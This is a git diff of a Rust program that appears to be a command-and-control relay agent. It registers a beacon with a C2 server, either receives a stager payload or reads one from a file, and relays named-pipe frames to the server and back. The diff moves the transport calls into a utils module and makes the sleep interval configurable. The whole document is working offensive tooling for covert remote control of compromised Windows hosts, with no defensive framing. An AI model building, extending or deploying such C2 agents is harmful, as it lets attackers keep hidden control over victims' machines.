@@ -6,18 +6,18 @@ use windows::Win32::Foundation::HANDLE;
 
 mod beacon;
 mod config;
-mod transport;
+mod transports;
 mod utils;
 
 // ── Stager mode ─────────────────────────────────────────────────────────
 #[cfg(feature = "stager")]
-async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transport::S3Transport), Box<dyn std::error::Error>> {
+async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transports::Transport), Box<dyn std::error::Error>> {
     // Register with C2 and get a transport handle
-    let transport = transport::register_beacon(beacon_id).await?;
+    let transport = utils::register_beacon(beacon_id).await?;
 
     // Wait for the stager payload
     println!("[-] agent: Waiting for stager...");
-    let mut tasks = transport::recv_data(&transport).await?;
+    let mut tasks = utils::recv_data(&transport).await?;
 
     let stager: Vec<u8> = tasks
         .drain(..)
@@ -38,7 +38,7 @@ async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transport::S3Transport),
 
 // ── Stagless mode ───────────────────────────────────────────────────────
 #[cfg(feature = "stagless")]
-async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transport::S3Transport), Box<dyn std::error::Error>> {
+async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transports::Transport), Box<dyn std::error::Error>> {
     // Read payload bytes from file
     println!("[-] agent: Reading payload from {}...", config::PAYLOAD_FILE);
     let stager: Vec<u8> = utils::read_file(config::PAYLOAD_FILE).await?;
@@ -50,7 +50,7 @@ async fn init_stage(beacon_id: &str) -> Result<(HANDLE, transport::S3Transport),
     let handle = beacon::start_beacon(&stager)?;
 
     // Register with C2 and get a transport handle
-    let transport = transport::register_beacon(beacon_id).await?;
+    let transport = utils::register_beacon(beacon_id).await?;
 
     Ok((handle, transport))
 }
@@ -63,8 +63,8 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     // interact loop
     loop {
+        sleep(Duration::from_secs(config::SLEEP_TIME)).await;
 
-        sleep(Duration::from_secs(1)).await;
         // Read a frame from the beacon pipe
         let chunk = beacon::read_frame(handle)?;
 
@@ -78,12 +78,12 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
         println!("[+] pipe: Received {} bytes from pipe", chunk.len());
         println!("[+] server: Relaying chunk to server");
-        transport::send_data(&transport, &chunk).await?;
+        utils::send_data(&transport, &chunk).await?;
 
         // Check for new tasks from transport
         println!("[-] server: Checking for new tasks from transport");
 
-        let new_tasks = transport::recv_data(&transport).await?;
+        let new_tasks = utils::recv_data(&transport).await?;
         for new_task in new_tasks {
             println!("[+] server: Got new task ({} bytes)", new_task.len());
             println!("[+] pipe: Writing {} bytes to pipe", new_task.len());
